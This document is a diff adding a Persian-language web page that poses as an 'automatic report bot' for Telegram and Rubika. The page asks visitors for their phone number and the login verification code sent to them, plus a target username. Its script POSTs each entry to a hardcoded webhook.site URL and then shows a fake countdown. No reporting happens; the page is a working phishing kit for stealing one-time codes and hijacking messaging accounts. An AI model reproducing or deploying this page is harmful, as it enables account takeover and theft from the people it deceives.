@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8" />
+<title>ربات ریپورت</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap');
+  body {
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    color: #fff;
+    font-family: 'Vazirmatn', Tahoma, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    direction: rtl;
+    margin: 0;
+    padding: 10px;
+  }
+  #container {
+    background: #1e1e1ecc;
+    padding: 40px 50px 50px 50px;
+    border-radius: 20px;
+    box-shadow: 0 0 30px #00c3ffcc;
+    width: 90%;
+    max-width: 600px;
+    min-width: 320px;
+  }
+  h1 {
+    text-align: center;
+    margin-bottom: 25px;
+    font-size: 30px;
+    color: #00c3ff;
+    font-weight: 700;
+  }
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 26px;
+  }
+  label {
+    font-size: 18px;
+    display: block;
+    margin-bottom: 8px;
+  }
+  select, input, button {
+    width: 100%;
+    padding: 16px 15px;
+    margin-top: 12px;
+    border: none;
+    border-radius: 10px;
+    font-size: 18px;
+    background: #333;
+    color: #fff;
+    box-sizing: border-box;
+    transition: 0.3s ease;
+  }
+  select:hover, input:hover {
+    background: #444;
+  }
+  button {
+    background-color: #00c3ff;
+    color: black;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 0 12px #00c3ff;
+  }
+  button:hover:not(:disabled) {
+    background-color: #00a9d9;
+    box-shadow: 0 0 20px #00a9d9;
+  }
+  button:disabled {
+    background-color: #005f6b;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  #step2 .info-text {
+    font-size: 15px;
+    margin-top: 5px;
+    color: #00ff99;
+    font-weight: 600;
+  }
+  #timer {
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    margin-top: 12px;
+    color: #00ff99;
+    letter-spacing: 1.5px;
+  }
+  #step1, #step2, #step3, #step4, #done {
+    display: none;
+  }
+  #step1 {
+    display: block;
+  }
+</style>
+</head>
+<body>
+<div id="container">
+  <h1>سازنده : ALEXTYPER</h1>
+  <h2>ربات ریپورت خودکار</h2>
+
+  <div id="step1">
+    <label>سرویس مورد نظر را انتخاب کنید:</label>
+    <select id="service">
+      <option value="تلگرام">تلگرام</option>
+      <option value="روبیکا">روبیکا</option>
+    </select>
+    <button onclick="sendService()">ادامه</button>
+  </div>
+
+  <div id="step2">
+    <label>شماره موبایل خود را وارد کنید:</label>
+    <input type="text" id="phone" placeholder="مثلاً 09123456789" maxlength="11" />
+    <div class="info-text">
+      دلیل گرفتن شماره اکانت خودتون : ریپورت ها با اکانت خودتون و ما انجام میشن و اکانت شما هم نقش مهمی داره.
+    </div>
+    <button onclick="sendPhone()">بعدی</button>
+  </div>
+
+  <div id="step3">
+    <label>کد تایید ارسال‌شده را وارد کنید:</label>
+    <input type="text" id="code" placeholder="مثلاً 123456" maxlength="10" />
+    <button id="verifyBtn" onclick="sendCode()">تایید</button>
+    <div id="timer"></div>
+  </div>
+
+  <div id="step4">
+    <label>آیدی یا کانال فرد مورد نظر برای ریپورت:</label>
+    <input type="text" id="target" placeholder="@username" />
+    <button onclick="sendTarget()">شروع ریپورت</button>
+  </div>
+
+  <div id="done">
+    <p style="font-size: 20px; text-align: center;">
+      ✅ ریپورت شروع شد و تا <span id="countdown">30</span> دقیقه دیگر ادامه دارد...
+    </p>
+    <div id="timer"></div>
+  </div>
+</div>
+
+<script>
+  const webhookUrl = "https://webhook.site/6d9dd230-c972-40f4-81f9-96241a0d1921";
+
+  function sendToWebhook(data) {
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        ...data,
+        timestamp: new Date().toLocaleString()
+      })
+    }).catch(e => console.error("خطا در ارسال به Webhook.site:", e));
+  }
+
+  function showStep(stepId) {
+    ["step1", "step2", "step3", "step4", "done"].forEach(id => {
+      document.getElementById(id).style.display = (id === stepId) ? "block" : "none";
+    });
+  }
+
+  function sendService() {
+    const service = document.getElementById("service").value;
+    sendToWebhook({ step: "service", service });
+    showStep("step2");
+  }
+
+  function sendPhone() {
+    const phone = document.getElementById("phone").value.trim();
+    const phoneRegex = /^09\d{9}$/;
+    if (!phoneRegex.test(phone)) {
+      alert("شماره موبایل معتبر وارد کنید (مثلاً 09123456789)");
+      return;
+    }
+    sendToWebhook({ step: "phone", phone });
+    showStep("step3");
+    startVerifyLockTimer();
+  }
+
+  let verifyLockSeconds = 10;
+  let verifyLockTimer = null;
+
+  function startVerifyLockTimer() {
+    verifyLockSeconds = 10;
+    const codeInput = document.getElementById("code");
+    const verifyBtn = document.getElementById("verifyBtn");
+    const timerDiv = document.getElementById("timer");
+
+    codeInput.disabled = true;
+    verifyBtn.disabled = true;
+    timerDiv.textContent = `لطفا تا ${verifyLockSeconds} ثانیه صبر کنید...`;
+
+    if (verifyLockTimer) clearInterval(verifyLockTimer);
+
+    verifyLockTimer = setInterval(() => {
+      verifyLockSeconds--;
+      timerDiv.textContent = `لطفا تا ${verifyLockSeconds} ثانیه صبر کنید...`;
+
+      if (verifyLockSeconds <= 0) {
+        clearInterval(verifyLockTimer);
+        codeInput.disabled = false;
+        verifyBtn.disabled = false;
+        timerDiv.textContent = "";
+      }
+    }, 1000);
+  }
+
+  function sendCode() {
+    const code = document.getElementById("code").value.trim();
+    if (!code) {
+      alert("کد تایید را وارد کنید");
+      return;
+    }
+    sendToWebhook({ step: "code", code });
+    showStep("step4");
+  }
+
+  function sendTarget() {
+    const target = document.getElementById("target").value.trim();
+    if (!target) {
+      alert("آیدی هدف را وارد کنید");
+      return;
+    }
+    sendToWebhook({ step: "target", target });
+    showStep("done");
+    startCountdown(30);
+  }
+
+  let countdownInterval = null;
+  function startCountdown(minutes) {
+    let remaining = minutes;
+    const countdownElem = document.getElementById("countdown");
+
+    if (countdownInterval) clearInterval(countdownInterval);
+    countdownElem.textContent = remaining;
+
+    countdownInterval = setInterval(() => {
+      remaining--;
+      countdownElem.textContent = remaining;
+      if (remaining <= 0) {
+        clearInterval(countdownInterval);
+        countdownElem.textContent = "0";
+      }
+    }, 60000);
+  }
+
+  // شروع اولیه
+  showStep("step1");
+</script>
+</body>
+</html>
